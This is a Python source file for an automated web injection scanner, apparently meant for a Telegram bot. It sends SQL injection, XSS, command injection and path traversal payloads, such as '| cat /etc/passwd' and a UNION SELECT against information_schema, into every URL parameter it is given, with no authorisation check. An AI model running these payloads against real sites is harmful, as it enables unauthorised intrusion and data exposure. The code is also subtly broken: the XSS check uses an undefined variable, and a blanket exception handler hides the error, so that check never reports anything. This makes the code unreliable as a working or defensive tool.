import asyncio
from urllib.parse import urlparse, parse_qs, urlencode
import requests

class InjectionScanner:
    PAYLOADS = {
        "SQL Injection": [
            "' OR '1'='1'-- -",
            "' OR 1=1--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null,table_name FROM information_schema.tables--"
        ],
        "XSS": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>"
        ],
        "Command Injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami"
        ],
        "Path Traversal": [
            "../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%5c..%5cwindows%5cwin.ini"
        ]
    }

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TelegramBotScanner/1.0"
        })

    async def scan_url(self, url):
        vulnerabilities = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        for param in query_params:
            for vuln_type, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    try:
                        # Create malicious URL
                        malicious_params = query_params.copy()
                        malicious_params[param] = [payload]
                        malicious_url = parsed._replace(
                            query=urlencode(malicious_params, doseq=True)
                        ).geturl()

                        # Send request
                        response = await asyncio.to_thread(
                            self.session.get,
                            malicious_url,
                            timeout=5
                        )

                        if self._is_vulnerable(response, vuln_type):
                            vulnerabilities.append({
                                "type": vuln_type,
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "evidence": self._extract_evidence(response.text)
                            })
                            break  # Stop after first successful payload

                    except Exception:
                        continue

        return vulnerabilities

    def _is_vulnerable(self, response, vuln_type):
        content = response.text.lower()
        status_code = response.status_code

        if vuln_type == "SQL Injection":
            return any(
                error in content for error in [
                    "syntax error", "mysql", "ora-", 
                    "sql server", "postgresql", "sqlite"
                ]
            ) or status_code == 500

        elif vuln_type == "XSS":
            return payload.lower() in content

        elif vuln_type == "Command Injection":
            return any(
                indicator in content for indicator in [
                    "root:", "bin", "etc/passwd", 
                    "directory listing", "command not found"
                ]
            )

        elif vuln_type == "Path Traversal":
            return "root:" in content or "daemon:" in content

        return False

    def _extract_evidence(self, response_text):
        # Extract relevant portions of response
        return response_text[:200] + "..." if len(response_text) > 200 else response_text

async def scan_for_injections(urls):
    scanner = InjectionScanner()
    all_vulnerabilities = []
    
    for url in urls:
        vulnerabilities = await scanner.scan_url(url)
        all_vulnerabilities.extend(vulnerabilities)
    
    return all_vulnerabilities